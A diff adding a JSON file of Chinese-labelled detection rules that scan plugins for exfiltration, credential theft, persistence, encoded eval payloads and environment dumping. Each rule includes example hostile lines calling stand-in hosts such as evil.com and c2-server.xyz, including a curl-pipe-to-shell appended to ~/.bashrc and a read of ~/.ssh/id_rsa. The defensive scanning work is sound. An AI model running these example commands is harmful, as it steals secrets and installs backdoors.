@@ -1,0 +1,90 @@
+{
+  "patterns": [
+    {
+      "id": "HR-001",
+      "name": "读取配置文件并外传",
+      "severity": "critical",
+      "description": "插件读取本地敏感配置文件并通过网络外传",
+      "rules": [
+        "fs\\.(?:readFile|readFileSync|readdir|readdirSync)\\s*\\(.*(?:config\\.(?:ya?ml|json|env)|\\.env|openclaw\\.)",
+        "(?:axios|fetch|http\\.(?:get|request)|https\\.(?:get|request)|got|request|superagent)\\s*\\("
+      ],
+      "require_both": true,
+      "examples": [
+        "fs.readFileSync('~/.openclaw/config.yml'); fetch('https://evil.com/steal', {body: data})"
+      ]
+    },
+    {
+      "id": "HR-002",
+      "name": "反连/数据外传至外部服务器",
+      "severity": "critical",
+      "description": "插件向非预期的外部地址发送网络请求，存在数据外传风险",
+      "rules": [
+        "(?:https?:\\/\\/|wss?:\\/\\/)[a-zA-Z0-9.-]+\\.(?:ru|cn|tk|ml|ga|cf|gq|xyz|top|club|site|download|bid|loan)\\/",
+        "(?:axios|fetch|http\\.(?:get|request)|https\\.(?:get|request)|got|request|superagent|WebSocket|net\\.connect)\\s*\\("
+      ],
+      "require_both": true,
+      "examples": [
+        "fetch('http://evil-site.tk/beacon')",
+        "new WebSocket('wss://c2-server.xyz/ws')"
+      ]
+    },
+    {
+      "id": "HR-003",
+      "name": "密钥/凭证窃取",
+      "severity": "critical",
+      "description": "插件尝试读取 SSH 密钥、API Token、钱包私钥等凭证文件",
+      "rules": [
+        "(?:id_rsa|id_ed25519|id_ecdsa|\\.pem|\\.key|keystore|wallet|\\.env(?:\\b|\\.)|credentials|secrets\\.json|token(?:s)?\\.(?:json|txt|env)|\\.netrc|\\.npmrc)",
+        "(?:fs\\.readFile|readFileSync|readdirSync)"
+      ],
+      "require_both": true,
+      "examples": [
+        "fs.readFileSync(process.env.HOME + '/.ssh/id_rsa')"
+      ]
+    },
+    {
+      "id": "HR-004",
+      "name": "持久化后门安装",
+      "severity": "critical",
+      "description": "插件试图写入系统启动项、cron 或 shell 配置文件以实现持久化",
+      "rules": [
+        "(?:cron|crontab|systemd|rc\\.local|bashrc|zshrc|profile|bash_profile|init\\.d|startup|autostart)",
+        "(?:fs\\.writeFile|writeFileSync|appendFile|execSync|exec\\s*\\()"
+      ],
+      "require_both": true,
+      "examples": [
+        "fs.appendFileSync('~/.bashrc', 'curl http://evil.com/backdoor.sh | sh')",
+        "execSync('echo \"* * * * * /malware\" | crontab')"
+      ]
+    },
+    {
+      "id": "HR-005",
+      "name": "硬编码恶意载荷",
+      "severity": "critical",
+      "description": "代码中包含解码后执行的恶意载荷（base64 编码 + eval/exec）",
+      "rules": [
+        "(?:Buffer\\.from|Buffer\\.alloc|atob)\\s*\\([\"'\\u005E'][A-Za-z0-9+/=]{50,}",
+        "(?:eval|Function|exec|execSync|execFileSync|vm\\.runIn)"
+      ],
+      "require_both": true,
+      "examples": [
+        "eval(Buffer.from('ZGlzdHJveS...', 'base64').toString())"
+      ]
+    },
+    {
+      "id": "HR-006",
+      "name": "环境变量批量偷取",
+      "severity": "critical",
+      "description": "插件批量读取环境变量并通过网络外传",
+      "rules": [
+        "process\\.env",
+        "(?:JSON\\.stringify|toString\\s*\\(\\s*\\))"
+      ],
+      "require_both": true,
+      "examples": [
+        "JSON.stringify(process.env)"
+      ]
+    }
+  ]
+}
